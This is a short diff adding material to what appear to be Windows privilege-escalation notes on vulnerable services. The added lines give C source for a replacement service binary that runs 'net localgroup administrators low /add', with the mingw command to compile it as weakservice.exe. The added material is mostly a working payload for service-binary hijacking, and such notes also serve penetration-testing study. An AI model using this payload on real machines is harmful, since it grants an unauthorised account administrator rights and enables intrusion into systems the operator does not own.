@@ -1,3 +1,22 @@
+
+binary to put in service.exe
+
+```
+ cat useradd.c
+#include <stdlib.h> /* system, NULL, EXIT_FAILURE */
+int main ()
+{
+ int i;
+ i=system ("net localgroup administrators low /add");
+ return 0;
+}
+```
+ to compile
+ 
+ `i686-w64-mingw32-gcc -o weakservice.exe useradd.c`
+
+
+
 Services
 
 Find services running with elevated privileges. Two main categories of vulnerabilities:
